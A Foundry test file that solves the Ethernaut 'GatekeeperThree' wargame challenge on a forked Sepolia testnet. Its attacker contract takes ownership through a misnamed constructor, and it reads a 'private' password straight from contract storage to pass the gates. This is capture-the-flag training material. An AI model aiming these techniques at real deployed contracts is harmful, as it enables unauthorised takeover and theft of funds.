// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "../HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {GatekeeperThree, SimpleTrick} from "../../src/ethernaut/GatekeeperThree.sol";

interface IGatekeeperThree {
    function construct0r() external;

    function enter() external;
}

contract Attack {
    address payable gateThree;

    constructor(address _gateThree) {
        gateThree = payable(_gateThree);
    }

    function attack() public payable {
        gateThree.transfer(msg.value);
        IGatekeeperThree(gateThree).construct0r();
        IGatekeeperThree(gateThree).enter();
    }
}

contract GatekeeperThreeAttacker is Test {
    address payable constant gatekeeperThree =
        payable(0xA067972BC43B2C8e3dC94B10CbA548C2952eB63C);
    uint256 constant blockNumber = 6359418;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    address trick;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
        trick = address(GatekeeperThree(payable(gatekeeperThree)).trick());
    }

    function testAttack() public {
        console.log("Attack Before:");
        console.log(
            "allowEntrance:",
            GatekeeperThree(gatekeeperThree).allowEntrance()
        );
        console.log("entrant:", GatekeeperThree(gatekeeperThree).entrant());
        _attack();
        console.log("Attack After:");
        console.log(
            "allowEntrance:",
            GatekeeperThree(gatekeeperThree).allowEntrance()
        );
        console.log("entrant:", GatekeeperThree(gatekeeperThree).entrant());
        assertEq(GatekeeperThree(gatekeeperThree).entrant(), alice);
    }

    function _attack() internal {
        vm.startPrank(alice, alice);

        uint256 password = uint256(vm.load(trick, bytes32(uint256(2))));
        console.log("password:", password);
        GatekeeperThree(gatekeeperThree).getAllowance(password);

        Attack attack = new Attack(gatekeeperThree);

        attack.attack{value: 0.001000001 ether}();

        vm.stopPrank();
    }
}
// forge test --match-contract GatekeeperThreeAttacker -vvv
